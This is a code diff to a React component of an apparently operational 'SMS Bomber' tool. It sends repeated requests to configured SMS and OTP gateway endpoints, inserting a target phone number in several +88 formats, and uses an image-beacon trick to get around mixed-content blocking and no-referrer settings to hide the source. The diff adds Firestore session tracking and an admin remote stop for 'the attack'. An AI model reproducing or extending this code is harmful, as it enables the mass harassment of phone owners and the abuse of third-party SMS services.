@@ -1,15 +1,18 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { MessageTemplate, LogEntry, ApiNode } from '../types';
-import { Zap, StopCircle, Terminal, Gauge, Server, AlertCircle } from 'lucide-react';
+import { MessageTemplate, LogEntry, ApiNode, UserProfile } from '../types';
+import { Zap, StopCircle, Terminal, Gauge, Server, CloudLightning } from 'lucide-react';
+import { addDoc, doc, updateDoc, onSnapshot } from "firebase/firestore"; 
+import { db, collections } from '../firebase';
 
 interface SenderProps {
   templates: MessageTemplate[];
   onSend: (log: LogEntry) => void;
   protectedNumbers: string[];
   activeNodes: ApiNode[];
+  currentUser: UserProfile | null;
 }
 
-const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, activeNodes }) => {
+const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, activeNodes, currentUser }) => {
   const [phoneNumber, setPhoneNumber] = useState('');
   const [amount, setAmount] = useState('');
   const [speed, setSpeed] = useState<'slow' | 'medium' | 'fast'>('medium');
@@ -17,10 +20,11 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
   const [consoleLogs, setConsoleLogs] = useState<string[]>([]);
   const [progress, setProgress] = useState(0);
   const [stats, setStats] = useState({ success: 0, fail: 0 });
-  const statsRef = useRef({ success: 0, fail: 0 }); // Ref for accurate final tracking
+  const statsRef = useRef({ success: 0, fail: 0 }); 
 
   const abortControllerRef = useRef<AbortController | null>(null);
   const scrollRef = useRef<HTMLDivElement>(null);
+  const activeSessionId = useRef<string | null>(null);
 
   useEffect(() => {
     if (scrollRef.current) {
@@ -41,13 +45,27 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     });
   };
 
-  const executeNode = async (node: ApiNode, phone: string, signal: AbortSignal) => {
-      // 1. Prepare Phone Variations
-      const raw = phone.replace(/^(\+88|88)/, ''); // 017...
-      const p88 = `88${raw}`; // 88017...
-      const pp88 = `+88${raw}`; // +88017...
+  const updateSessionInDb = async (final = false) => {
+    if (activeSessionId.current && db) {
+        try {
+            const sessionRef = doc(db, 'active_sessions', activeSessionId.current);
+            await updateDoc(sessionRef, {
+                sent: statsRef.current.success,
+                failed: statsRef.current.fail,
+                lastUpdate: new Date(),
+                status: final ? 'completed' : 'running'
+            });
+        } catch (e) {
+            console.error("Sync failed", e);
+        }
+    }
+  };
 
-      // 2. Prepare Payload & URL
+  const executeNode = async (node: ApiNode, phone: string, signal: AbortSignal) => {
+      const raw = phone.replace(/^(\+88|88)/, ''); 
+      const p88 = `88${raw}`; 
+      const pp88 = `+88${raw}`; 
+
       let body = node.body
         .replace(/{phone}/g, raw)
         .replace(/{phone_88}/g, p88)
@@ -58,18 +76,10 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
         .replace(/{phone_88}/g, p88)
         .replace(/{phone_p88}/g, pp88);
 
-      // 3. Prepare Headers
       let headers = {};
-      try {
-        headers = JSON.parse(node.headers);
-      } catch (e) {
-        throw new Error("Invalid Header Config");
-      }
+      try { headers = JSON.parse(node.headers); } catch (e) { }
 
-      // 4. Execute
       const isGet = node.method === 'GET';
-
-      // MIXED CONTENT BYPASS STRATEGY
       const isMixedContent = typeof window !== 'undefined' && 
                              window.location.protocol === 'https:' && 
                              url.trim().startsWith('http:');
@@ -78,18 +88,10 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
           return new Promise<Response>((resolve) => {
               const img = new Image();
               const beaconUrl = url + (url.includes('?') ? '&' : '?') + `_t=${Date.now()}`;
-              
               const finish = () => {
-                  resolve({ 
-                      status: 200, 
-                      ok: true, 
-                      text: async () => "Beacon Sent" 
-                  } as unknown as Response);
+                  resolve({ status: 200, ok: true, text: async () => "Beacon Sent" } as unknown as Response);
               };
-
-              img.onload = finish;
-              img.onerror = finish;
-              img.src = beaconUrl;
+              img.onload = finish; img.onerror = finish; img.src = beaconUrl;
               setTimeout(finish, 3000);
           });
       }
@@ -100,19 +102,27 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
           body: !isGet ? body : undefined,
           signal,
           mode: isGet ? 'no-cors' : 'cors',
-          cache: 'no-store', // Attempt to reduce caching
-          referrerPolicy: 'no-referrer' // Hide referrer
+          cache: 'no-store',
+          referrerPolicy: 'no-referrer'
       });
       return response;
   };
 
-  const handleStop = () => {
+  const handleStop = async (remote = false) => {
     if (abortControllerRef.current) {
       abortControllerRef.current.abort();
       abortControllerRef.current = null;
     }
-    // Note: State update happens in the loop exit logic
-    addLog(">> STOP REQUESTED...");
+    addLog(remote ? ">> STOPPED BY ADMIN" : ">> STOP REQUESTED...");
+    
+    if (activeSessionId.current && db) {
+        try {
+            await updateDoc(doc(db, 'active_sessions', activeSessionId.current), {
+                status: remote ? 'stopped' : 'interrupted',
+                lastUpdate: new Date()
+            });
+        } catch(e) {}
+    }
   };
 
   const handleStart = async () => {
@@ -142,12 +152,45 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     addLog(`>> INITIALIZING... TARGET: ${phoneNumber}`);
     addLog(`>> GATEWAYS: ${activeNodes.length} ACTIVE`);
 
+    // 1. Create Session in DB (if online)
+    let unsubscribe: any = null;
+    if (db && currentUser && !currentUser.uid.startsWith('guest_')) {
+        try {
+            addLog(">> SYNCING TO CLOUD...");
+            const docRef = await addDoc(collections.sessions(db), {
+                userId: currentUser.uid,
+                username: currentUser.username,
+                target: phoneNumber,
+                amount: count,
+                sent: 0,
+                failed: 0,
+                status: 'running',
+                startTime: new Date(),
+                lastUpdate: new Date()
+            });
+            activeSessionId.current = docRef.id;
+
+            // Listen for Remote Stop
+            unsubscribe = onSnapshot(doc(db, 'active_sessions', docRef.id), (doc) => {
+                const data = doc.data();
+                if (data && data.status === 'stopped') {
+                    if (abortControllerRef.current) {
+                        handleStop(true);
+                    }
+                }
+            });
+        } catch (e) {
+            addLog(">> CLOUD SYNC FAILED. RUNNING LOCAL.");
+        }
+    }
+
     abortControllerRef.current = new AbortController();
     const signal = abortControllerRef.current.signal;
 
     for (let i = 0; i < count; i++) {
       if (signal.aborted) break;
 
+      // Batch requests to all nodes
       const promises = activeNodes.map(async (api) => {
         try {
           const res = await executeNode(api, phoneNumber, signal);
@@ -172,12 +215,21 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
       });
 
       await Promise.all(promises);
+      
+      // Update DB every 5 iterations or if finished
+      if ((i % 5 === 0 || i === count - 1) && !signal.aborted) {
+          updateSessionInDb();
+      }
+
       if (signal.aborted) break;
       setProgress(((i + 1) / count) * 100);
       if (i < count - 1) await new Promise(r => setTimeout(r, getDelay()));
     }
 
-    // Finished or Stopped - Save Log
+    // Cleanup
+    if (unsubscribe) unsubscribe();
+    await updateSessionInDb(true); // Final status update
+    
     const totalSent = statsRef.current.success;
     const totalFailed = statsRef.current.fail;
     const isStopped = signal.aborted;
@@ -194,6 +246,7 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     });
 
     setIsRunning(false);
+    activeSessionId.current = null;
     abortControllerRef.current = null;
   };
 
@@ -201,14 +254,22 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
     <div className="p-5 pb-10 space-y-6 animate-fade-in">
       
       {/* Distinct Page Header for Bomber */}
-      <div className="border-b border-zinc-800 pb-4 flex items-center gap-3">
-          <div className="p-2 bg-red-600 rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)]">
-             <Zap className="w-6 h-6 text-white fill-white" />
+      <div className="border-b border-zinc-800 pb-4 flex items-center justify-between">
+          <div className="flex items-center gap-3">
+            <div className="p-2 bg-red-600 rounded-lg shadow-[0_0_15px_rgba(220,38,38,0.4)]">
+                <Zap className="w-6 h-6 text-white fill-white" />
+            </div>
+            <div>
+                <h2 className="text-xl font-black italic tracking-tighter text-white uppercase">SMS Bomber</h2>
+                <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / HIGH_SPEED_ENGINE</p>
+            </div>
           </div>
-          <div>
-             <h2 className="text-xl font-black italic tracking-tighter text-white uppercase">SMS Bomber</h2>
-             <p className="text-[10px] text-zinc-500 font-mono-code">V3.5 / HIGH_SPEED_ENGINE</p>
-          </div>
+          {isRunning && (
+              <div className="flex items-center gap-2 px-3 py-1 bg-emerald-500/10 border border-emerald-500/20 rounded-full animate-pulse">
+                  <CloudLightning className="w-3 h-3 text-emerald-500" />
+                  <span className="text-[9px] font-bold text-emerald-500 uppercase tracking-widest">Live Sync</span>
+              </div>
+          )}
       </div>
 
       <div className="space-y-4">
@@ -261,9 +322,17 @@ const Sender: React.FC<SenderProps> = ({ templates, onSend, protectedNumbers, ac
            </div>
         </div>
 
+        {/* Info Box */}
+        <div className="p-3 bg-zinc-900/50 border border-zinc-800 rounded-lg flex items-start gap-2 text-zinc-500 text-[10px]">
+           <CloudLightning className="w-4 h-4 text-zinc-400 mt-0.5 shrink-0" />
+           <p className="leading-relaxed">
+             <strong>Cloud Mode:</strong> Session is monitored in real-time. Do not close this tab, or the attack will pause. Background processing is simulated via live-sync.
+           </p>
+        </div>
+
         {/* Action Button */}
         <button
-          onClick={isRunning ? handleStop : handleStart}
+          onClick={isRunning ? () => handleStop() : handleStart}
           className={`w-full py-4 rounded-xl font-bold uppercase tracking-wider text-sm shadow-lg transition-all transform active:scale-[0.98] flex items-center justify-center gap-2 ${
             isRunning 
             ? 'bg-zinc-800 hover:bg-zinc-700 text-red-500 border border-red-900/50' 
